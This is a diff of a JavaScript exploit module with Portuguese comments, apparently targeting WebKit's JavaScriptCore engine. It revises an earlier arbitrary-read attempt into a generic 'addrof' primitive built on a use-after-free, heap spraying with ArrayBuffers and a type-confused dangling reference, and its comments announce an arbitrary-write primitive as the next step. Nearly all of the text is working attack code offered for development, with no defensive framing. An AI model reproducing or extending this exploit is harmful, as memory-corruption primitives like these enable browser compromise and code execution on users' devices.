@@ -1,10 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R58 - Correção da Chamada do Construtor)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R59 - Construção de Primitiva Addrof Genérica)
 // =======================================================================================
-// O R57 estava quase perfeito, mas falhou devido a um erro de programação simples.
-// ESTA VERSÃO CORRIGE APENAS UMA LINHA:
-// - A chamada para 'new AdvancedInt64' na FASE 6 foi corrigida para usar números em
-//   vez de strings, o que estava causando a exceção.
-// A estratégia de Abuso Direto permanece a mesma.
+// O R58 provou que a escrita arbitrária "cega" é instável.
+// ESTA VERSÃO MUDA O FOCO: em vez de tentar a cadeia completa, vamos usar nosso UAF estável
+// para construir uma ferramenta essencial e reutilizável: uma função addrof(obj) genérica.
+// - A FASE 6 foi completamente refeita para definir e testar essa nova função.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -18,7 +17,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R58_ConstructorFix";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R59_Generic_Addrof";
 
 function int64ToDouble(int64) {
     const buf = new ArrayBuffer(8);
@@ -29,21 +28,27 @@ function int64ToDouble(int64) {
     return f64[0];
 }
 
+// Helper para a conversão inversa, que usaremos em nossa nova função addrof
+function doubleToInt64(d) {
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+    f64[0] = d;
+    return new AdvancedInt64(u32[0], u32[1]);
+}
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R58 - ConstructorFix)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R59 - Generic Addrof)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Correção do Construtor (R58) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Construindo Addrof Genérico (R59) ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
     let dangling_ref = null;
-    let spray_buffers = [];
-    const SPRAY_BUFFER_SIZE = 136;
 
     try {
-        // FASES 1-5: Mantidas do R57, pois estavam funcionando perfeitamente.
+        // FASES 1-5: Mantidas, pois são a base para obter a nossa ferramenta UAF.
         logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
         await triggerGC_Tamed();
         logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
@@ -55,9 +60,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await triggerGC_Tamed();
         logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");
         logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
+        // A pulverização é necessária para que o 'dangling_ref' aponte para um ArrayBuffer
+        const spray_buffers = [];
         for (let i = 0; i < 1024; i++) {
-            const buf = new ArrayBuffer(SPRAY_BUFFER_SIZE);
-            spray_buffers.push(buf);
+            spray_buffers.push(new ArrayBuffer(136));
         }
         logS3(`    Pulverização de ${spray_buffers.length} buffers concluída.`, "info");
         logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");
@@ -65,51 +71,47 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             throw new Error(`Falha no UAF. Tipo da propriedade era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
         }
         logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
-        const leaked_ptr_double = dangling_ref.corrupted_prop;
-        const buf_conv = new ArrayBuffer(8);
-        (new Float64Array(buf_conv))[0] = leaked_ptr_double;
-        const int_view = new Uint32Array(buf_conv);
-        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
-        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
         
-        // FASE 6: Abuso Direto e Verificação por Força Bruta
-        logS3("--- FASE 6: Abuso Direto da Referência Confusa ---", "subtest");
-        
-        // *** MUDANÇA R58: Corrigida a chamada do construtor para usar NÚMEROS em vez de STRINGS ***
-        const target_address_to_read = new AdvancedInt64(0x0, 0x08000000);
-        
-        logS3(`    Escrevendo no ponteiro interno de um buffer desconhecido via 'dangling_ref.prop_b'...`, "info");
-        dangling_ref.prop_b = int64ToDouble(target_address_to_read);
+        // FASE 6: Construir e Testar a Primitiva 'addrof' Genérica
+        logS3("--- FASE 6: Construindo e Testando a Primitiva 'addrof' Genérica ---", "subtest");
 
-        logS3("    Verificando todos os buffers pulverizados pelo resultado da escrita...", "info");
-        let read_value = null;
-        let success = false;
-        for (const buf of spray_buffers) {
-            try {
-                const hacked_view = new DataView(buf);
-                const val = hacked_view.getUint32(0, true);
-
-                if (val === 0x464c457f || val !== 0) { 
-                    logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
-                    logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(val)}`, "leak");
-                    read_value = val;
-                    success = true;
-                    break;
-                }
-            } catch (e) {
-                // Ignora erros
-            }
+        // Nossa ferramenta principal: a função addrof
+        function addrof(obj) {
+            // Usamos a referência confusa para transformar um objeto em seu endereço
+            dangling_ref.prop_a = obj;
+            const leaked_double = dangling_ref.prop_a;
+            return doubleToInt64(leaked_double);
         }
 
-        if (!success) {
-            throw new Error("A escrita arbitrária foi realizada, mas nenhum buffer retornou o valor esperado.");
+        logS3("    Função 'addrof' definida. Testando...", "info");
+
+        // Criamos objetos de teste para encontrar seus endereços
+        const test_obj1 = { value: 0xAAAAAAAA };
+        const test_obj2 = { value: 0xBBBBBBBB };
+
+        const addr1 = addrof(test_obj1);
+        const addr2 = addrof(test_obj2);
+
+        logS3(`Endereço do test_obj1: ${addr1.toString(true)}`, "leak");
+        logS3(`Endereço do test_obj2: ${addr2.toString(true)}`, "leak");
+
+        // Verificação de sanidade
+        if (!isAdvancedInt64Object(addr1) || !isAdvancedInt64Object(addr2)) {
+            throw new Error("addrof não retornou um objeto AdvancedInt64 válido.");
         }
+        if (addr1.equals(addr2)) {
+            throw new Error("addrof retornou o mesmo endereço para dois objetos diferentes.");
+        }
+        if (addr1.low() === 0 && addr1.high() === 0) {
+            throw new Error("addrof retornou um endereço nulo para test_obj1.");
+        }
+        
+        logS3("++++++++++++ SUCESSO! PRIMITIVA 'addrof' GENÉRICA FUNCIONAL! ++++++++++++", "vuln");
 
         final_result = { 
             success: true, 
-            message: "Primitiva de Leitura Arbitrária construída com sucesso via UAF!",
-            leaked_addr: leaked_addr.toString(true),
-            arb_read_test_value: toHex(read_value)
+            message: "Primitiva 'addrof' genérica construída e validada com sucesso!",
+            test_addrs: [addr1.toString(true), addr2.toString(true)]
         };
 
     } catch (e) {
@@ -127,7 +129,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 }
 
 
-// --- Funções Auxiliares (sem alterações do R57) ---
+// --- Funções Auxiliares (sem alterações do R58) ---
 async function triggerGC_Tamed() {
     logS3("    Acionando GC Domado (Tamed)...", "info");
     try {
@@ -147,8 +149,9 @@ function sprayAndCreateDanglingPointer() {
     let dangling_ref_internal = null;
     function createScope() {
         const victim = {
-            prop_a: 0x11111111, prop_b: 0x22222222, 
-            corrupted_prop: 0.12345,
+            prop_a: 0.1, // Alvo para nossa função addrof
+            prop_b: 0.2, // Alvo futuro para arb_write
+            corrupted_prop: 0.3,
             p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
             p16: 0, p17: 0
         };
